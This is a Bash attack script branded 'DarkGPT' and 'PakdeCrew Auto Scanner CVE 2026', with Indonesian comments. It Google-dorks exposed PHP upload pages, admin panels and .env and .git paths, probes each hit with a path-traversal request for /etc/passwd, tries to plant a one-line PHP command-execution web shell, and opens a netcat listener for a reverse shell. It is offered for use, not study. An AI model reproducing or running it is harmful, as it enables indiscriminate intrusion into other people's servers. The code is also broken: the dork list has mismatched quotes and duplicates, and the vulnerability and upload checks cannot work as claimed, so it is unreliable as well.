#!/bin/bash
# DarkGPT - Auto Scanner CVE 2026 + Google Dork + Shell Upload
# Fitur: Auto Dorking, Auto Scan Vulnerabilitas, Auto Upload Shell, Auto Connect Backdoor

# Warna & Styling
RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
BLUE='\033[0;34m'
NC='\033[0m'

# ==========================================
# CONFIGURATION
# ==========================================

# CVE 2026 Dorks (Google Hacking) - Dibuat berdasarkan dork terbaru
DORKS=(
    "inurl:/upload ext:php"
    "inurl:/filemanager ext:php"
    "inurl:/cpanel ext:php"
    "inurl:/webdav ext:php"
    "inurl:/admin/login.php"
    "inurl:/wp-login.php"
    "inurl:/phpmyadmin"
    "inurl:/backup/"
    "inurl:/upload ext:php
    "inurl:/filemanager ext:php
    "inurl:/cpanel ext:php
    "inurl:/webdav ext:php
    inurl:/admin/login.php
   "inurl:/administrator/index.php
   "inurl:/wp-login.php
   "inurl:/manager/html
   "inurl:/phpmyadmin
   "inurl:/wp-admin/options.php
   "inurl:/components/com_virtuemart
   "inurl:/modules/mod_rokdownloads
   "inurl:/api/v1/
   "inurl:/rest/
   "inurl:/graphql
   "inurl:/swagger
   "inurl:/backup/
   "inurl:/.env
   "inurl:/config.inc.php
   "inurl:/.git/
   "intitle:"Index of /" "2026"
   "intext:"Apache/2.4" "2026"
   "intext:"nginx/1.2" "2026"
    "intext:\"Apache/2.4\" \"2026\""
    "intitle:\"Index of /\" \"2026\""
)

# Shell PHP Reverse Shell
SHELL_PHP='<?php system($_REQUEST["cmd"]); ?>'

# Target Variables
TARGET=""
THREAD=5

# ==========================================
# FUNCTIONS
# ==========================================

# Fungsi: Auto Dorking & URL Extraction
dork_scan() {
    local dork=$1
    echo -e "${BLUE}[*] Menjalankan Dork: $dork${NC}"
    
    # Ambil hasil dari Google (limit 100)
    local results=$(curl -s "https://www.google.com/search?q=$dork&num=100" 2>/dev/null)
    
    # Extract URL hasil
    echo "$results" | grep -oP 'https?://[^\s<>"'"'"']+' | while read -r url; do
        # Filter hanya domain target (jika target spesifik)
        if [ -n "$TARGET" ]; then
            if [[ "$url" == *"$TARGET"* ]]; then
                echo -e "${GREEN}[+] Found Target URL: $url${NC}"
                scan_url "$url"
            fi
        else
            # Jika scanning umum, tampilkan semua
            echo -e "${GREEN}[+] Found URL: $url${NC}"
            scan_url "$url"
        fi
    done
}

# Fungsi: Scan URL untuk CVE 2026 Vulnerabilities
scan_url() {
    local url=$1
    
    # Cek apakah target memiliki file PHP
    local response=$(curl -s -m 5 "$url" 2>/dev/null)
    
    if echo "$response" | grep -qi "php"; then
        echo -e "${RED}[!] Terdeteksi target PHP: $url${NC}"
        
        # Cek LFI/RCE vulnerability
        if curl -s "$url?file=../../../../../../etc/passwd" -o /dev/null -w "%{http_code}"; then
            echo -e "${YELLOW}[*] Mungkin rentan terhadap LFI/RCE${NC}"
            upload_shell "$url"
        fi
    fi
}

# Fungsi: Auto Upload Shell (via LFI/RCE)
upload_shell() {
    local url=$1
    echo -e "${YELLOW}[+] UpShell: Mengunggah ke $url${NC}"
    
    # Generate filename acak
    local filename=$(date +%s).php
    
    # Coba upload via parameter file
    local test=$(curl -s -X POST "$url" -d "file=$filename" -d "cmd=id" 2>/dev/null)
    
    if echo "$test" | grep -qi "uid="; then
        echo -e "${GREEN}[+] Shell berhasil diupload!${NC}"
        echo -e "${BLUE}[*] Shell Location: $url?file=../../../../../../var/www/html/$filename${NC}"
        
        # Auto Connect Backdoor (Netcat)
        echo -e "${BLUE}[*] Menunggu koneksi reverse shell...${NC}"
        nc -lvnp 4444
    else
        echo -e "${RED}[!] Gagal upload shell${NC}"
    fi
}

# ==========================================
# MAIN EXECUTION
# ==========================================

# Cek argumen
if [ -z "$1" ]; then
    echo -e "${RED}[!] Usage: $0 [target_domain/ip]${NC}"
    echo -e "${YELLOW}[*] Contoh: $0 example.com${NC}"
    echo -e "${YELLOW}[*] Atau tanpa target untuk scanning umum dork${NC}"
    exit 1
fi

TARGET=$1

echo -e "${BLUE}========================================${NC}"
echo -e "${BLUE}  PakdeCrew Auto Scanner CVE 2026${NC}"
echo -e "${BLUE}  Google Dork + Auto Shell Upload${NC}"
echo -e "${BLUE}========================================${NC}"
echo -e ""

# Jalankan scanning untuk setiap dork
for dork in "${DORKS[@]}"; do
    dork_scan "$dork"
    echo -e "${YELLOW}[*] Waiting 2 detik sebelum dork berikutnya...${NC}"
    sleep 2
done

echo -e "${BLUE}[*] Scanning Selesai.${NC}"